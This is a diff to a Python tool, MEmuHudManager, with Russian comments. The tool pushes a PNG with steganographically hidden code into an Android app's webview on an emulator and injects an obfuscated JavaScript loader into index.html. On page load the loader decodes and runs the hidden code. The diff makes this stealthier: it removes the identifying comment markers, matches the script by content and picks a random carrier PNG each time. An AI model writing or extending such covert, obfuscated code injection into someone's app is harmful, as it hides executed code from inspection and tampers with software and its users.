@@ -2785,13 +2785,9 @@ class MEmuHudManager:
     # PNG-стеганография (как в Release_new: чанки stEG + kEy?)
     # ──────────────────────────────────────────────────────────────────────────
 
-    # Маркеры для index.html
-    _PNG_HTML_START = "<!-- === HASSLE PNG START === -->"
-    _PNG_HTML_END   = "<!-- === HASSLE PNG END === -->"
-
-    # Обфусцированный стартёр (идентичен Release_new/uiresources/index.html)
+    # Обфусцированный стартёр (идентичен Release_new/uiresources/index.html, без маркеров)
     _PNG_STARTER_SCRIPT = (
-        '<script>\n'
+        '<script>'
         '(function (_0x7f1){var _0x9a2=new XMLHttpRequest,_0x4e3=function(_0xb1){var _0xc2=0,'
         '_0xd3=setInterval(function(){var _0xe4=window.App&&window.App.$refs&&window.App.$refs.console;'
         'if(_0xe4&&_0xe4.log){clearInterval(_0xd3);_0xe4.log(\'[PNG] \'+_0xb1)}else if(++_0xc2>200)'
@@ -2810,7 +2806,7 @@ class MEmuHudManager:
         '_0xe3=document.createElement(\'script\');_0xe3.textContent=_0xf5(_0x9e);'
         'window.addEventListener(\'error\',_0x49);document.head.appendChild(_0xe3);'
         'window.removeEventListener(\'error\',_0x49)}catch(_0xf4){'
-        '_0x4e3(\'сбой: \'+(_0xf4.message||_0xf4))}};_0x9a2.send()})(\'./assets/image_out.png\');\n'
+        '_0x4e3(\'сбой: \'+(_0xf4.message||_0xf4))}};_0x9a2.send()})(\'./assets/image_out.png\');'
         '</script>'
     )
 
@@ -2866,24 +2862,41 @@ class MEmuHudManager:
         return out, had_code
 
     def _index_html_inject(self, html: str) -> str:
-        """Добавляет PNG-стартёр в index.html (или заменяет старый)."""
+        """Добавляет PNG-стартёр в index.html перед </body>, без каких-либо комментариев."""
         html = self._index_html_remove(html)  # убрать старый, если был
-        block = (f"\n    {self._PNG_HTML_START}\n"
-                 f"    {self._PNG_STARTER_SCRIPT}\n"
-                 f"    {self._PNG_HTML_END}\n")
+        block = f"\n    {self._PNG_STARTER_SCRIPT}\n"
         if '</body>' in html:
             return html.replace('</body>', block + '  </body>')
         return html.rstrip() + '\n' + block
 
     def _index_html_remove(self, html: str) -> str:
-        """Убирает блок PNG-стартёра из index.html."""
-        start = html.find(self._PNG_HTML_START)
-        if start == -1:
-            return html
-        end = html.find(self._PNG_HTML_END, start)
-        if end == -1:
-            return html
-        return html[:start] + html[end + len(self._PNG_HTML_END):]
+        """Убирает PNG-стартёр из index.html — ищет по содержимому, без маркеров."""
+        # Ищем <script>...</script> содержащий ссылку на image_out.png
+        cleaned = re.sub(
+            r'\s*<script>[^<]*image_out\.png[^<]*</script>',
+            '',
+            html,
+            flags=re.DOTALL,
+        )
+        return cleaned
+
+    def _save_png_source(self, app_folder: str, png_name: str):
+        """Сохраняет имя PNG-источника в AppData и логирует полный путь."""
+        try:
+            info_file = self.local_accounts_file.parent / "png_sources.json"
+            data = {}
+            if info_file.exists():
+                try:
+                    data = json.loads(info_file.read_text(encoding='utf-8'))
+                except Exception:
+                    pass
+            data[app_folder] = png_name
+            info_file.write_text(
+                json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')
+            self.log(f"[√] PNG: {info_file}  →  {png_name}")
+        except Exception as e:
+            if self.full_logging:
+                self.log(f"[!] Не удалось сохранить PNG-источник: {e}")
 
     def replace_with_code(self, app_folder):
         # Снимаем снапшот ADB-состояния до старта операции —
@@ -2916,8 +2929,10 @@ class MEmuHudManager:
             if not pngs:
                 self.log("[X] Ошибка: В assets нет PNG-файлов")
                 return
-            # Предпочитаем любой PNG кроме image_out.png (его мы сами и создаём)
-            source_png = next((p for p in pngs if p.lower() != 'image_out.png'), pngs[0])
+            # Берём случайный PNG (не image_out.png) — каждый раз разный
+            import random as _random
+            candidates = [p for p in pngs if p.lower() != 'image_out.png'] or pngs
+            source_png = _random.choice(candidates)
             if self.full_logging:
                 self.log(f"PNG для встраивания: {source_png}")
 
@@ -2989,6 +3004,7 @@ class MEmuHudManager:
                          else f"[X] push image_out.png: {r.stderr.strip()}")
                 return
             self.log("[√] Успешно: image_out.png загружен")
+            self._save_png_source(app_folder, source_png)
 
             # ── 6. Обновить index.html: добавить PNG-стартёр ─────────────────
             index_remote = f"{webview_path}/index.html"
@@ -3149,9 +3165,9 @@ class MEmuHudManager:
             r = _run([adb_path] + device_param + ["pull", index_remote, str(index_local)])
             if r.returncode == 0:
                 html = index_local.read_text(encoding='utf-8', errors='replace')
-                if self._PNG_HTML_START in html:
-                    html = self._index_html_remove(html)
-                    index_local.write_text(html, encoding='utf-8')
+                cleaned = self._index_html_remove(html)
+                if cleaned != html:
+                    index_local.write_text(cleaned, encoding='utf-8')
                     r2 = _run([adb_path] + device_param + [
                         "push", str(index_local), index_remote])
                     if r2.returncode == 0:
